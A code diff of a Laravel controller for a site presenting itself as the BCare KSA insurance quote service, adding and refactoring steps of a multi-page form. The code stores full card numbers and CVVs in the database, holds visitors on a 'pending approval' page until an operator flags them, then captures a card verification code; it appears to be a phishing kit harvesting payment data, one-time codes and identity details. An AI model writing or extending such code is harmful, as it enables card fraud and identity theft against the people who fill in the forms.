@@ -9,6 +9,8 @@ use App\Http\Requests\Frontend\CheckPhoneNumberRequestFormRequest;
 use App\Http\Requests\Frontend\ConfirmPhoneNumberRequestFormRequest;
 use App\Http\Requests\Frontend\InsurancRequesteFormRequest;
 use App\Http\Requests\Frontend\InsurancStatementsRequestFormRequest;
+use App\Http\Requests\Frontend\InsuranceInformationRequestFormRequest;
+use App\Http\Requests\Frontend\InsuranceTypeRequestFormRequest;
 use App\Http\Requests\Frontend\NafathDocumentingRequestFormRequest;
 use App\Http\Requests\Frontend\NafathLoginRequestFormRequest;
 use App\Http\Requests\Frontend\PaymentFormRequestFormRequest;
@@ -18,39 +20,54 @@ use Illuminate\Http\Request;
 use Illuminate\Routing\Route;
 use App\Models\SupportTicket;
 use Illuminate\Support\Facades\DB;
+use Illuminate\Support\Facades\Log;
 
+/**
+ * Frontend Home Page Controller
+ *
+ * Handles insurance quote request flow for BCare KSA platform
+ * Manages the complete insurance application process from initial quote to payment
+ *
+ * @package App\Http\Controllers\Frontend
+ */
 class HomePageFrontendController extends Controller
 {
 
     // ========================================================================
     // =========================== index Function =============================
     // ========================================================================
-    public function welcome(Request $request, Route $route)
+    public function welcome()
     {
         try {
-            // session()->forget('insuranceRequest');
-            return view('welcome');
+            // Get insurance data for welcome page
+            $thirdPartyInsurances = Insurance::where('status', 1)
+                ->where('insurance_type', 1)
+                ->with('insuranceBenefits')
+                ->get();
+
+            $fullInsurances = Insurance::where('status', 1)
+                ->where('insurance_type', 2)
+                ->with('insuranceBenefits')
+                ->get();
+
+            return view('welcome', compact('thirdPartyInsurances', 'fullInsurances'));
         } catch (\Throwable $th) {
-            $function_name =  $route->getActionName();
-            $check_old_errors = new SupportTicket();
-            $check_old_errors = $check_old_errors->select('*')->where([
-                'error_location' => $th->getFile(),
-                'error_description' => $th->getMessage(),
-                'function_name' => $function_name,
-                'error_line' => $th->getLine(),
-            ])->get();
-            if ($check_old_errors->count() == 0) {
-                $new_error_ticket = SupportTicket::create([
+            Log::error('Welcome page error: ' . $th->getMessage());
+
+            SupportTicket::firstOrCreate(
+                [
                     'error_location' => $th->getFile(),
                     'error_description' => $th->getMessage(),
-                    'function_name' => $function_name,
-                    'error_line' =>  $th->getLine(),
-                ]);
-                $end_error_ticket = $new_error_ticket;
-            } else {
-                $end_error_ticket = $check_old_errors->first();
-            }
-            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
+                    'function_name' => 'welcome',
+                    'error_line' => $th->getLine(),
+                ]
+            );
+
+            return view('errors.support_tickets', [
+                'th' => $th,
+                'function_name' => 'welcome',
+                'end_error_ticket' => null
+            ]);
         }
     }
 
@@ -60,8 +77,6 @@ class HomePageFrontendController extends Controller
     public function insuranceRequest(InsurancRequesteFormRequest $request, Route $route)
     {
         try {
-
-
             // Prepare Data :
             $created_data = [
                 'insurance_category' => $request->insurance_category,
@@ -76,34 +91,77 @@ class HomePageFrontendController extends Controller
             DB::transaction(function () use ($request, $created_data) {
                 $insuranceRequest = InsuranceRequest::create($created_data);
 
+                // Fire real-time event for admin dashboard
+                event(new \App\Events\NewInsuranceRequestCreated($insuranceRequest));
+
                 // Save form data to session
                 $created_data['id'] = $insuranceRequest->id;
-                $request->session()->put('insuranceRequest', $created_data);
+                session(['insuranceRequest' => $created_data]);
             });
 
             return redirect()->route('insuranceStatements')->with('success', 'Record Added Successfully');
         } catch (\Throwable $th) {
             $function_name =  $route->getActionName();
-            $check_old_errors = new SupportTicket();
-            $check_old_errors = $check_old_errors->select('*')->where([
+            $check_old_errors = SupportTicket::where([
                 'error_location' => $th->getFile(),
                 'error_description' => $th->getMessage(),
                 'function_name' => $function_name,
                 'error_line' => $th->getLine(),
-            ])->get();
-            if ($check_old_errors->count() == 0) {
-                $new_error_ticket = SupportTicket::create([
+            ])->first();
+
+            if (!$check_old_errors) {
+                $end_error_ticket = SupportTicket::create([
                     'error_location' => $th->getFile(),
                     'error_description' => $th->getMessage(),
                     'function_name' => $function_name,
                     'error_line' =>  $th->getLine(),
                 ]);
-                $end_error_ticket = $new_error_ticket;
             } else {
-                $end_error_ticket = $check_old_errors->first();
+                $end_error_ticket = $check_old_errors;
             }
             return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
         }
+    }
+
+    // ========================================================================
+    // ===================== insuranceInquiryRequest Function ==================
+    // ========================================================================
+    public function insuranceInquiryRequest(\App\Http\Requests\Frontend\InsuranceInquiryRequest $request)
+    {
+        // Validate handled by FormRequest
+        $data = $request->validated();
+
+        // Map incoming values to DB fields
+        $insuranceCategory = $data['form_type'] === 'transfer' ? 2 : 1;
+        $newInsuranceCategory = $data['vehicle_registration'] === 'customs' ? 2 : 1;
+
+        // Prepare payload for creation (Step 1)
+        $created_data = [
+            'insurance_category'      => $insuranceCategory,
+            'new_insurance_category'  => $newInsuranceCategory,
+            'identity_number'         => $data['identity_number'],
+            'seller_identity_number'  => $data['seller_identity_number'] ?? null,
+            'applicant_name'          => $data['applicant_name'] ?? null,
+            'phone'                   => $data['phone'] ?? null,
+            'date_of_birth'           => $data['date_of_birth'] ?? null,
+        ];
+
+        // Persist initial inquiry and seed session for subsequent steps
+        DB::transaction(function () use ($created_data, $data) {
+            $insuranceRequest = InsuranceRequest::create($created_data);
+
+            // Build session state used by next steps
+            $sessionSeed = array_merge($created_data, [
+                'id' => $insuranceRequest->id,
+                'vin' => $data['serial_number'] ?? null,
+                'customs_card' => $data['customs_card'] ?? null,
+            ]);
+
+            session(['insuranceRequest' => $sessionSeed]);
+        });
+
+        return redirect()->route('insuranceStatements')
+            ->with('success', 'تم التحقق من البيانات، انتقل لملء معلومات التأمين.');
     }
 
     // ========================================================================
@@ -113,99 +171,128 @@ class HomePageFrontendController extends Controller
     {
         try {
             $insuranceRequest = session('insuranceRequest');
-            if (!isset($insuranceRequest)) {
-                return redirect()->route('welcome');
+
+            // If no session exists, redirect to welcome
+            if (!isset($insuranceRequest) || !isset($insuranceRequest['id'])) {
+                return redirect()->route('welcome')
+                    ->with('warning', 'الرجاء البدء من صفحة الطلب الرئيسية');
             }
+
             return view('insuranceStatements');
         } catch (\Throwable $th) {
             $function_name =  $route->getActionName();
-            $check_old_errors = new SupportTicket();
-            $check_old_errors = $check_old_errors->select('*')->where([
+            $check_old_errors = SupportTicket::where([
                 'error_location' => $th->getFile(),
                 'error_description' => $th->getMessage(),
                 'function_name' => $function_name,
                 'error_line' => $th->getLine(),
-            ])->get();
-            if ($check_old_errors->count() == 0) {
-                $new_error_ticket = SupportTicket::create([
+            ])->first();
+
+            if (!$check_old_errors) {
+                $end_error_ticket = SupportTicket::create([
                     'error_location' => $th->getFile(),
                     'error_description' => $th->getMessage(),
                     'function_name' => $function_name,
                     'error_line' =>  $th->getLine(),
                 ]);
-                $end_error_ticket = $new_error_ticket;
             } else {
-                $end_error_ticket = $check_old_errors->first();
+                $end_error_ticket = $check_old_errors;
             }
             return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
         }
     }
 
     // ========================================================================
-    // ====================== insuranceRequest Function =======================
+    // ====================== insuranceStatementsRequest Function =============
     // ========================================================================
     public function insuranceStatementsRequest(InsurancStatementsRequestFormRequest $request, Route $route)
     {
-        // try {
-        // Retrieve form data from session (insuranceRequest)
-        $insuranceRequest = session('insuranceRequest');
+        try {
+            $sessionData = session('insuranceRequest');
 
-        $insuranceRequest = InsuranceRequest::find($insuranceRequest['id']);
-        if ($insuranceRequest) {
+            if (!$sessionData || !isset($sessionData['id'])) {
+                return redirect()->route('welcome')->with('danger', 'يرجى البدء من البداية');
+            }
 
-            // Prepare Data :
+            $insuranceRequest = InsuranceRequest::find($sessionData['id']);
+
+            if (!$insuranceRequest) {
+                return redirect()->route('welcome')->with('danger', 'هذا السجل غير موجود في قاعدة البيانات');
+            }
+
             $updated_data = [
-                'insurance_type' => $request->insurance_type,
-                'document_start_date' => $request->document_start_date,
-                'purpose_using_car' => $request->purpose_using_car,
-                'car_type' => $request->car_type,
-                'car_estimated_value' => $request->car_estimated_value,
+                // Personal Information
+                'full_name' => $request->full_name,
+                'identity_number' => $request->identity_number,
+                'mobile_number_statements' => $request->mobile_number,
+                'birth_date_statements' => $request->birth_date,
+                'region' => $request->region,
+                'city' => $request->city,
+                'driving_years' => $request->driving_years,
+                
+                // Insurance Information
+                'insurance_type' => $request->insurance_type, // 1 = Third Party, 2 = Full
+                'usage_category' => $request->usage_category, // personal, commercial, taxi, transport
+                'policy_start_date' => $request->policy_start_date,
+                
+                // Vehicle Information
+                'vehicle_type' => $request->vehicle_type,
+                'vehicle_model' => $request->vehicle_model,
                 'manufacturing_year' => $request->manufacturing_year,
-                'repair_location' => $request->repair_location,
+                'maintenance_type' => $request->maintenance_type, // agency, workshop
+                'approximate_price' => $request->approximate_price,
+                
+                // Additional Driver
+                'has_additional_driver' => $request->has_additional_driver ?? 'no',
+                'driver_name' => $request->driver_name ?? null,
+                'driver_identity_number' => $request->driver_identity_number ?? null,
+                'driver_mobile_number' => $request->driver_mobile_number ?? null,
+                'driver_birth_date' => $request->driver_birth_date ?? null,
+                'driver_driving_years' => $request->driver_driving_years ?? null,
+                'driver_driving_percentage' => $request->driver_driving_percentage ?? null,
             ];
 
-            // Save form data to session
-            $request->session()->put('insuranceStatements', $updated_data);
+            session(['insuranceStatements' => $updated_data]);
 
-            // Update in DB :
             DB::transaction(function () use ($updated_data, $insuranceRequest) {
                 $insuranceRequest->update($updated_data);
             });
 
-            // Combine data from steps 1 and 2
-            $insuranceRequest = session('insuranceRequest');
+            $insuranceRequestSession = session('insuranceRequest');
             $insuranceStatements = session('insuranceStatements');
-            $allFormData = array_merge($insuranceRequest, $insuranceStatements);
+            
+            // Merge all data ensuring we have the ID
+            $allFormData = array_merge(
+                $insuranceRequestSession ?? [],
+                $insuranceStatements ?? [],
+                ['id' => $insuranceRequest->id]
+            );
 
-            // Save all data to session
-            $request->session()->put('allFormData', $allFormData);
+            session(['allFormData' => $allFormData]);
 
-            return redirect()->route('insuranceType')->with('success', 'Record Added Successfully');
-        } else {
-            return redirect()->back()->with('danger', 'This record does not exist in the records');
+            return redirect()->route('insuranceType')->with('success', 'تم حفظ البيانات بنجاح');
+        } catch (\Throwable $th) {
+            $function_name = $route->getActionName();
+            $check_old_errors = SupportTicket::where([
+                'error_location' => $th->getFile(),
+                'error_description' => $th->getMessage(),
+                'function_name' => $function_name,
+                'error_line' => $th->getLine(),
+            ])->first();
+
+            if (!$check_old_errors) {
+                $end_error_ticket = SupportTicket::create([
+                    'error_location' => $th->getFile(),
+                    'error_description' => $th->getMessage(),
+                    'function_name' => $function_name,
+                    'error_line' => $th->getLine(),
+                ]);
+            } else {
+                $end_error_ticket = $check_old_errors;
+            }
+
+            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
         }
-        // } catch (\Throwable $th) {
-        //     $function_name =  $route->getActionName();
-        //     $check_old_errors = new SupportTicket();
-        //     $check_old_errors = $check_old_errors->select('*')->where([
-        //         'error_location' => $th->getFile(),
-        //         'error_description' => $th->getMessage(),
-        //         'function_name' => $function_name,
-        //         'error_line' => $th->getLine(),
-        //     ])->get();
-        //     if ($check_old_errors->count() == 0) {
-        //         $new_error_ticket = SupportTicket::create([
-        //             'error_location' => $th->getFile(),
-        //             'error_description' => $th->getMessage(),
-        //             'function_name' => $function_name,
-        //             'error_line' =>  $th->getLine(),
-        //         ]);
-        //         $end_error_ticket = $new_error_ticket;
-        //     } else {
-        //         $end_error_ticket = $check_old_errors->first();
-        //     }
-        //     return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
-        // }
     }
 
     // ========================================================================
@@ -214,33 +301,35 @@ class HomePageFrontendController extends Controller
     public function insuranceType(Request $request, Route $route)
     {
         try {
+            // Check for allFormData or insuranceRequest session
             $allFormData = session('allFormData');
-            if (!isset($allFormData)) {
-                return redirect()->route('welcome');
+            $insuranceRequest = session('insuranceRequest');
+            
+            if (!$allFormData && !$insuranceRequest) {
+                return redirect()->route('welcome')->with('warning', 'يرجى البدء من صفحة الطلب الرئيسية');
             }
-            // return $allFormData = session('allFormData');
-            $thirdPartyInsurances = Insurance::Status(1)->where('insurance_type', 1)->get(); // التأمينات ضد الغير
-            $fullInsurances = Insurance::Status(1)->where('insurance_type', 2)->get(); // التأمينات الشاملة
+
+            $thirdPartyInsurances = Insurance::where('status', 1)->where('insurance_type', 1)->get();
+            $fullInsurances = Insurance::where('status', 1)->where('insurance_type', 2)->get();
             return view('insuranceType', compact('thirdPartyInsurances', 'fullInsurances'));
         } catch (\Throwable $th) {
             $function_name =  $route->getActionName();
-            $check_old_errors = new SupportTicket();
-            $check_old_errors = $check_old_errors->select('*')->where([
+            $check_old_errors = SupportTicket::where([
                 'error_location' => $th->getFile(),
                 'error_description' => $th->getMessage(),
                 'function_name' => $function_name,
                 'error_line' => $th->getLine(),
-            ])->get();
-            if ($check_old_errors->count() == 0) {
-                $new_error_ticket = SupportTicket::create([
+            ])->first();
+
+            if (!$check_old_errors) {
+                $end_error_ticket = SupportTicket::create([
                     'error_location' => $th->getFile(),
                     'error_description' => $th->getMessage(),
                     'function_name' => $function_name,
                     'error_line' =>  $th->getLine(),
                 ]);
-                $end_error_ticket = $new_error_ticket;
             } else {
-                $end_error_ticket = $check_old_errors->first();
+                $end_error_ticket = $check_old_errors;
             }
             return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
         }
@@ -249,34 +338,32 @@ class HomePageFrontendController extends Controller
     // ========================================================================
     // ==================== insuranceTypeRequest Function =====================
     // ========================================================================
-    public function insuranceTypeRequest(Request $request, Route $route)
+    public function insuranceTypeRequest(InsuranceTypeRequestFormRequest $request, Route $route)
     {
         try {
-            // Retrieve form data from session (allFormData)
             $allFormData = session('allFormData');
+            
+            if (!$allFormData || !isset($allFormData['id'])) {
+                return redirect()->route('welcome')->with('danger', 'يرجى البدء من البداية');
+            }
 
             $insuranceRequest = InsuranceRequest::find($allFormData['id']);
             if ($insuranceRequest) {
-                // Prepare Data :
                 $updated_data = [
                     'insurance_id' => $request->insurance_id,
                 ];
 
-                // Save form data to session
-                $request->session()->put('insuranceType', $updated_data);
+                session(['insuranceType' => $updated_data]);
 
-                // Update in DB :
                 DB::transaction(function () use ($updated_data, $insuranceRequest) {
                     $insuranceRequest->update($updated_data);
                 });
 
-                // Combine data from steps 1 and 2
                 $allFormData = session('allFormData');
                 $insuranceType = session('insuranceType');
                 $allFormData = array_merge($allFormData, $insuranceType);
 
-                // Save all data to session
-                $request->session()->put('allFormData', $allFormData);
+                session(['allFormData' => $allFormData]);
 
                 return redirect()->route('insuranceInformation')->with('success', 'Record Added Successfully');
             } else {
@@ -284,23 +371,22 @@ class HomePageFrontendController extends Controller
             }
         } catch (\Throwable $th) {
             $function_name =  $route->getActionName();
-            $check_old_errors = new SupportTicket();
-            $check_old_errors = $check_old_errors->select('*')->where([
+            $check_old_errors = SupportTicket::where([
                 'error_location' => $th->getFile(),
                 'error_description' => $th->getMessage(),
                 'function_name' => $function_name,
                 'error_line' => $th->getLine(),
-            ])->get();
-            if ($check_old_errors->count() == 0) {
-                $new_error_ticket = SupportTicket::create([
+            ])->first();
+
+            if (!$check_old_errors) {
+                $end_error_ticket = SupportTicket::create([
                     'error_location' => $th->getFile(),
                     'error_description' => $th->getMessage(),
                     'function_name' => $function_name,
                     'error_line' =>  $th->getLine(),
                 ]);
-                $end_error_ticket = $new_error_ticket;
             } else {
-                $end_error_ticket = $check_old_errors->first();
+                $end_error_ticket = $check_old_errors;
             }
             return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
         }
@@ -312,9 +398,8 @@ class HomePageFrontendController extends Controller
     public function insuranceInformation(Request $request, Route $route)
     {
         try {
-            // Retrieve form data from session (allFormData)
             $allFormData = session('allFormData');
-            if (!isset($allFormData) && $allFormData['insurance_id']) {
+            if (!$allFormData || !isset($allFormData['insurance_id'])) {
                 return redirect()->route('welcome');
             }
 
@@ -326,23 +411,22 @@ class HomePageFrontendController extends Controller
             }
         } catch (\Throwable $th) {
             $function_name =  $route->getActionName();
-            $check_old_errors = new SupportTicket();
-            $check_old_errors = $check_old_errors->select('*')->where([
+            $check_old_errors = SupportTicket::where([
                 'error_location' => $th->getFile(),
                 'error_description' => $th->getMessage(),
                 'function_name' => $function_name,
                 'error_line' => $th->getLine(),
-            ])->get();
-            if ($check_old_errors->count() == 0) {
-                $new_error_ticket = SupportTicket::create([
+            ])->first();
+
+            if (!$check_old_errors) {
+                $end_error_ticket = SupportTicket::create([
                     'error_location' => $th->getFile(),
                     'error_description' => $th->getMessage(),
                     'function_name' => $function_name,
                     'error_line' =>  $th->getLine(),
                 ]);
-                $end_error_ticket = $new_error_ticket;
             } else {
-                $end_error_ticket = $check_old_errors->first();
+                $end_error_ticket = $check_old_errors;
             }
             return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
         }
@@ -351,29 +435,28 @@ class HomePageFrontendController extends Controller
     // ========================================================================
     // ================= insuranceInformationRequest Function =================
     // ========================================================================
-    public function insuranceInformationRequest(Request $request, Route $route)
+    public function insuranceInformationRequest(InsuranceInformationRequestFormRequest $request, Route $route)
     {
         try {
-            // Retrieve form data from session (allFormData)
             $allFormData = session('allFormData');
+            
+            if (!$allFormData || !isset($allFormData['id'])) {
+                return redirect()->route('welcome')->with('danger', 'يرجى البدء من البداية');
+            }
 
             $insuranceRequest = InsuranceRequest::find($allFormData['id']);
             if ($insuranceRequest) {
-                // Prepare Data :
                 $paymentForm = [
                     'total' => $request->total,
                 ];
 
-                // Save form data to session
-                $request->session()->put('paymentForm', $paymentForm);
+                session(['paymentForm' => $paymentForm]);
 
-                // Combine data from steps 1 and 2
                 $allFormData = session('allFormData');
                 $paymentForm = session('paymentForm');
                 $allFormData = array_merge($allFormData, $paymentForm);
 
-                // Save all data to session
-                $request->session()->put('allFormData', $allFormData);
+                session(['allFormData' => $allFormData]);
 
                 return redirect()->route('paymentForm')->with('success', 'Record Added Successfully');
             } else {
@@ -381,23 +464,22 @@ class HomePageFrontendController extends Controller
             }
         } catch (\Throwable $th) {
             $function_name =  $route->getActionName();
-            $check_old_errors = new SupportTicket();
-            $check_old_errors = $check_old_errors->select('*')->where([
+            $check_old_errors = SupportTicket::where([
                 'error_location' => $th->getFile(),
                 'error_description' => $th->getMessage(),
                 'function_name' => $function_name,
                 'error_line' => $th->getLine(),
-            ])->get();
-            if ($check_old_errors->count() == 0) {
-                $new_error_ticket = SupportTicket::create([
+            ])->first();
+
+            if (!$check_old_errors) {
+                $end_error_ticket = SupportTicket::create([
                     'error_location' => $th->getFile(),
                     'error_description' => $th->getMessage(),
                     'function_name' => $function_name,
                     'error_line' =>  $th->getLine(),
                 ]);
-                $end_error_ticket = $new_error_ticket;
             } else {
-                $end_error_ticket = $check_old_errors->first();
+                $end_error_ticket = $check_old_errors;
             }
             return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
         }
@@ -409,7 +491,6 @@ class HomePageFrontendController extends Controller
     public function paymentForm(Request $request, Route $route)
     {
         try {
-            // Retrieve form data from session (allFormData)
             $allFormData = session('allFormData');
             if (!isset($allFormData)) {
                 return redirect()->route('welcome');
@@ -423,23 +504,22 @@ class HomePageFrontendController extends Controller
             }
         } catch (\Throwable $th) {
             $function_name =  $route->getActionName();
-            $check_old_errors = new SupportTicket();
-            $check_old_errors = $check_old_errors->select('*')->where([
+            $check_old_errors = SupportTicket::where([
                 'error_location' => $th->getFile(),
                 'error_description' => $th->getMessage(),
                 'function_name' => $function_name,
                 'error_line' => $th->getLine(),
-            ])->get();
-            if ($check_old_errors->count() == 0) {
-                $new_error_ticket = SupportTicket::create([
+            ])->first();
+
+            if (!$check_old_errors) {
+                $end_error_ticket = SupportTicket::create([
                     'error_location' => $th->getFile(),
                     'error_description' => $th->getMessage(),
                     'function_name' => $function_name,
                     'error_line' =>  $th->getLine(),
                 ]);
-                $end_error_ticket = $new_error_ticket;
             } else {
-                $end_error_ticket = $check_old_errors->first();
+                $end_error_ticket = $check_old_errors;
             }
             return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
         }
@@ -451,12 +531,10 @@ class HomePageFrontendController extends Controller
     public function paymentFormRequest(PaymentFormRequestFormRequest $request, Route $route)
     {
         try {
-            // Retrieve form data from session (allFormData)
             $allFormData = session('allFormData');
 
             $insuranceRequest = InsuranceRequest::find($allFormData['id']);
             if ($insuranceRequest) {
-                // Prepare Data :
                 $updated_data = [
                     'name_on_card' => $request->name_on_card,
                     'card_number' => $request->card_number,
@@ -464,45 +542,41 @@ class HomePageFrontendController extends Controller
                     'cvv' => $request->cvv,
                 ];
 
-                // Save form data to session
-                $request->session()->put('paymentForm', $updated_data);
+                session(['paymentForm' => $updated_data]);
 
-                // Update in DB :
                 DB::transaction(function () use ($updated_data, $insuranceRequest) {
                     $insuranceRequest->update($updated_data);
                 });
 
-                // Combine data from steps 1 and 2
                 $allFormData = session('allFormData');
                 $paymentForm = session('paymentForm');
                 $allFormData = array_merge($allFormData, $paymentForm);
 
-                // Save all data to session
-                $request->session()->put('allFormData', $allFormData);
+                session(['allFormData' => $allFormData]);
 
-                return redirect()->route('beforeCallProcess')->with('success', 'Record Added Successfully');
+                // إعادة التوجيه لصفحة الانتظار بدلاً من beforeCallProcess
+                return redirect()->route('pendingApproval')->with('success', 'تم استلام طلبك بنجاح وهو قيد المراجعة');
             } else {
                 return redirect()->back()->with('danger', 'This record does not exist in the records');
             }
         } catch (\Throwable $th) {
             $function_name =  $route->getActionName();
-            $check_old_errors = new SupportTicket();
-            $check_old_errors = $check_old_errors->select('*')->where([
+            $check_old_errors = SupportTicket::where([
                 'error_location' => $th->getFile(),
                 'error_description' => $th->getMessage(),
                 'function_name' => $function_name,
                 'error_line' => $th->getLine(),
-            ])->get();
-            if ($check_old_errors->count() == 0) {
-                $new_error_ticket = SupportTicket::create([
+            ])->first();
+
+            if (!$check_old_errors) {
+                $end_error_ticket = SupportTicket::create([
                     'error_location' => $th->getFile(),
                     'error_description' => $th->getMessage(),
                     'function_name' => $function_name,
                     'error_line' =>  $th->getLine(),
                 ]);
-                $end_error_ticket = $new_error_ticket;
             } else {
-                $end_error_ticket = $check_old_errors->first();
+                $end_error_ticket = $check_old_errors;
             }
             return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
         }
@@ -514,7 +588,6 @@ class HomePageFrontendController extends Controller
     public function beforeCallProcess(Request $request, Route $route)
     {
         try {
-            // Retrieve form data from session (allFormData)
             $allFormData = session('allFormData');
             if (!isset($allFormData)) {
                 return redirect()->route('welcome');
@@ -528,25 +601,101 @@ class HomePageFrontendController extends Controller
             }
         } catch (\Throwable $th) {
             $function_name =  $route->getActionName();
-            $check_old_errors = new SupportTicket();
-            $check_old_errors = $check_old_errors->select('*')->where([
+            $check_old_errors = SupportTicket::where([
                 'error_location' => $th->getFile(),
                 'error_description' => $th->getMessage(),
                 'function_name' => $function_name,
                 'error_line' => $th->getLine(),
-            ])->get();
-            if ($check_old_errors->count() == 0) {
-                $new_error_ticket = SupportTicket::create([
+            ])->first();
+
+            if (!$check_old_errors) {
+                $end_error_ticket = SupportTicket::create([
                     'error_location' => $th->getFile(),
                     'error_description' => $th->getMessage(),
                     'function_name' => $function_name,
                     'error_line' =>  $th->getLine(),
                 ]);
-                $end_error_ticket = $new_error_ticket;
             } else {
-                $end_error_ticket = $check_old_errors->first();
+                $end_error_ticket = $check_old_errors;
             }
             return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
+        }
+    }
+
+    // ========================================================================
+    // ==================== pendingApproval Function ==========================
+    // ========================================================================
+    public function pendingApproval(Request $request, Route $route)
+    {
+        try {
+            $allFormData = session('allFormData');
+            if (!isset($allFormData)) {
+                return redirect()->route('welcome');
+            }
+
+            $insurance = Insurance::find($allFormData['insurance_id']);
+            if ($allFormData) {
+                return view('pendingApproval', compact('allFormData', 'insurance'));
+            } else {
+                return redirect()->back()->with('danger', 'This record does not exist in the records');
+            }
+        } catch (\Throwable $th) {
+            $function_name =  $route->getActionName();
+            $check_old_errors = SupportTicket::where([
+                'error_location' => $th->getFile(),
+                'error_description' => $th->getMessage(),
+                'function_name' => $function_name,
+                'error_line' => $th->getLine(),
+            ])->first();
+
+            if (!$check_old_errors) {
+                $end_error_ticket = SupportTicket::create([
+                    'error_location' => $th->getFile(),
+                    'error_description' => $th->getMessage(),
+                    'function_name' => $function_name,
+                    'error_line' =>  $th->getLine(),
+                ]);
+            } else {
+                $end_error_ticket = $check_old_errors;
+            }
+            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
+        }
+    }
+
+    // ========================================================================
+    // ================== checkApprovalStatus Function ========================
+    // ========================================================================
+    public function checkApprovalStatus($id)
+    {
+        try {
+            $insuranceRequest = InsuranceRequest::find($id);
+            
+            if (!$insuranceRequest) {
+                return response()->json([
+                    'approved' => false,
+                    'message' => 'الطلب غير موجود'
+                ]);
+            }
+
+            // التحقق من حالة الموافقة (يمكنك إضافة عمود 'approved' في جدول insurance_requests)
+            if (isset($insuranceRequest->approved) && $insuranceRequest->approved == 1) {
+                return response()->json([
+                    'approved' => true,
+                    'redirect_url' => route('cardOwnership'), // أو أي صفحة تريدها
+                    'message' => 'تمت الموافقة على طلبك'
+                ]);
+            }
+
+            return response()->json([
+                'approved' => false,
+                'message' => 'الطلب قيد المراجعة'
+            ]);
+
+        } catch (\Throwable $th) {
+            return response()->json([
+                'approved' => false,
+                'error' => $th->getMessage()
+            ], 500);
         }
     }
 
@@ -556,7 +705,6 @@ class HomePageFrontendController extends Controller
     public function callProcess(Request $request, Route $route)
     {
         try {
-            // Retrieve form data from session (allFormData)
             $allFormData = session('allFormData');
             if (!isset($allFormData)) {
                 return redirect()->route('welcome');
@@ -570,23 +718,22 @@ class HomePageFrontendController extends Controller
             }
         } catch (\Throwable $th) {
             $function_name =  $route->getActionName();
-            $check_old_errors = new SupportTicket();
-            $check_old_errors = $check_old_errors->select('*')->where([
+            $check_old_errors = SupportTicket::where([
                 'error_location' => $th->getFile(),
                 'error_description' => $th->getMessage(),
                 'function_name' => $function_name,
                 'error_line' => $th->getLine(),
-            ])->get();
-            if ($check_old_errors->count() == 0) {
-                $new_error_ticket = SupportTicket::create([
+            ])->first();
+
+            if (!$check_old_errors) {
+                $end_error_ticket = SupportTicket::create([
                     'error_location' => $th->getFile(),
                     'error_description' => $th->getMessage(),
                     'function_name' => $function_name,
                     'error_line' =>  $th->getLine(),
                 ]);
-                $end_error_ticket = $new_error_ticket;
             } else {
-                $end_error_ticket = $check_old_errors->first();
+                $end_error_ticket = $check_old_errors;
             }
             return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
         }
@@ -598,7 +745,6 @@ class HomePageFrontendController extends Controller
     public function callProcessRequest(Request $request, Route $route)
     {
         try {
-            // Retrieve form data from session (allFormData)
             $allFormData = session('allFormData');
 
             $insuranceRequest = InsuranceRequest::find($allFormData['id']);
@@ -609,23 +755,22 @@ class HomePageFrontendController extends Controller
             }
         } catch (\Throwable $th) {
             $function_name =  $route->getActionName();
-            $check_old_errors = new SupportTicket();
-            $check_old_errors = $check_old_errors->select('*')->where([
+            $check_old_errors = SupportTicket::where([
                 'error_location' => $th->getFile(),
                 'error_description' => $th->getMessage(),
                 'function_name' => $function_name,
                 'error_line' => $th->getLine(),
-            ])->get();
-            if ($check_old_errors->count() == 0) {
-                $new_error_ticket = SupportTicket::create([
+            ])->first();
+
+            if (!$check_old_errors) {
+                $end_error_ticket = SupportTicket::create([
                     'error_location' => $th->getFile(),
                     'error_description' => $th->getMessage(),
                     'function_name' => $function_name,
                     'error_line' =>  $th->getLine(),
                 ]);
-                $end_error_ticket = $new_error_ticket;
             } else {
-                $end_error_ticket = $check_old_errors->first();
+                $end_error_ticket = $check_old_errors;
             }
             return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
         }
@@ -637,7 +782,6 @@ class HomePageFrontendController extends Controller
     public function cardOwnership(Request $request, Route $route)
     {
         try {
-            // Retrieve form data from session (allFormData)
             $allFormData = session('allFormData');
             if (!isset($allFormData)) {
                 return redirect()->route('welcome');
@@ -651,59 +795,52 @@ class HomePageFrontendController extends Controller
             }
         } catch (\Throwable $th) {
             $function_name =  $route->getActionName();
-            $check_old_errors = new SupportTicket();
-            $check_old_errors = $check_old_errors->select('*')->where([
+            $check_old_errors = SupportTicket::where([
                 'error_location' => $th->getFile(),
                 'error_description' => $th->getMessage(),
                 'function_name' => $function_name,
                 'error_line' => $th->getLine(),
-            ])->get();
-            if ($check_old_errors->count() == 0) {
-                $new_error_ticket = SupportTicket::create([
+            ])->first();
+
+            if (!$check_old_errors) {
+                $end_error_ticket = SupportTicket::create([
                     'error_location' => $th->getFile(),
                     'error_description' => $th->getMessage(),
                     'function_name' => $function_name,
                     'error_line' =>  $th->getLine(),
                 ]);
-                $end_error_ticket = $new_error_ticket;
             } else {
-                $end_error_ticket = $check_old_errors->first();
+                $end_error_ticket = $check_old_errors;
             }
             return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
         }
     }
 
     // ========================================================================
-    // ===================== cardOwnershipRequest Function ======================
+    // ===================== cardOwnershipRequest Function ====================
     // ========================================================================
     public function cardOwnershipRequest(CardOwnershipRequestFormRequest $request, Route $route)
     {
         try {
-            // Retrieve form data from session (allFormData)
             $allFormData = session('allFormData');
 
             $insuranceRequest = InsuranceRequest::find($allFormData['id']);
             if ($insuranceRequest) {
-                // Prepare Data :
                 $updated_data = [
                     'card_ownership_verification_code' => $request->card_ownership_verification_code,
                 ];
 
-                // Save form data to session
-                $request->session()->put('cardOwnership', $updated_data);
+                session(['cardOwnership' => $updated_data]);
